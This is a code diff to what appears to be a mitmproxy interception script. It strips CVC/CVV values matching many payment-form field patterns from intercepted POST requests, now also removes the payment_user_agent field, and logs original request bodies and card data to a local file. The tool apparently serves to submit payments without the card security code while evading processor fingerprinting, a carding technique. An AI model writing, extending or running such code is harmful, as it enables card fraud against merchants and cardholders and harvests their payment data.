@@ -3,8 +3,8 @@ import re
 import json
 import os
 
-# Universal patterns to match CVV values in the request body
-UNIVERSAL_CVV_PATTERNS = [
+# Patterns to match CVV values and payment user agent in the request body
+REGEX_PATTERNS = [
     rb"payment_method_data\[card\]\[cvc\]=[\d]{3,4}",
     rb"card\[cvc\]=[\d]{3,4}",
     rb"source_data\[card\]\[cvc\]=[\d]{3,4}",
@@ -37,7 +37,8 @@ UNIVERSAL_CVV_PATTERNS = [
     rb"cardVerificationCode=[\d]{3,4}",
     rb"cvcNumber=[\d]{3,4}",
     rb"cvv_num=[\d]{3,4}",
-    rb"cvc_num=[\d]{3,4}"
+    rb"cvc_num=[\d]{3,4}",
+    rb"payment_method_data\[payment_user_agent\]=[^\&]*"
 ]
 
 LOG_FILE = "cvv_log.json"
@@ -67,29 +68,30 @@ def clean_up_trailing_characters(request_body: bytes) -> bytes:
     Cleans up trailing commas and quotes left behind after removing CVV values.
     """
     cleaned_body = re.sub(rb",\s*\"[^\"]*\":\s*\"\"", b"", request_body)
+    cleaned_body = re.sub(rb"&\s*payment_method_data\[payment_user_agent\]=[^\&]*", b"", cleaned_body)
     return cleaned_body
 
-def remove_cvc_from_request_body(request_body: bytes) -> (bytes, bool):
+def remove_cvc_and_agent_from_request_body(request_body: bytes) -> (bytes, bool):
     """
-    Removes the CVV value from the request body based on the universal patterns.
-    Returns the modified request body and a flag indicating if CVV was removed.
+    Removes the CVV value and payment user agent from the request body based on the patterns.
+    Returns the modified request body and a flag indicating if any sensitive data was removed.
     """
-    cvv_removed = False
-    for pattern in UNIVERSAL_CVV_PATTERNS:
+    data_removed = False
+    for pattern in REGEX_PATTERNS:
         if re.search(pattern, request_body):
-            cvv_removed = True
+            data_removed = True
         request_body = re.sub(pattern, b"", request_body)
-    return request_body, cvv_removed
+    return request_body, data_removed
 
 def modify_request(flow: http.HTTPFlow):
     """
-    Modifies the intercepted request to remove CVV data.
+    Modifies the intercepted request to remove CVV data and payment user agent.
     """
     # Log the original request data for debugging
     log_request_body(flow, "Original Request Body")
 
-    # Remove CVV codes from the payment data
-    modified_body, cvv_removed = remove_cvc_from_request_body(flow.request.content)
+    # Remove CVV codes and payment user agent from the payment data
+    modified_body, data_removed = remove_cvc_and_agent_from_request_body(flow.request.content)
     
     # Clean up any trailing characters if necessary
     modified_body = clean_up_trailing_characters(modified_body)
@@ -100,13 +102,13 @@ def modify_request(flow: http.HTTPFlow):
     # Set the modified body back to the request
     flow.request.content = modified_body
 
-    # If CVV was removed, log the CVV data
-    if cvv_removed:
+    # If sensitive data was removed, log the CVV data
+    if data_removed:
         log_cvv_data(flow)
 
 def request(flow: http.HTTPFlow):
     """
-    This function intercepts and modifies requests to remove CVV data.
+    This function intercepts and modifies requests to remove CVV data and payment user agent.
     """
     if flow.request.method == "POST":
         modify_request(flow)
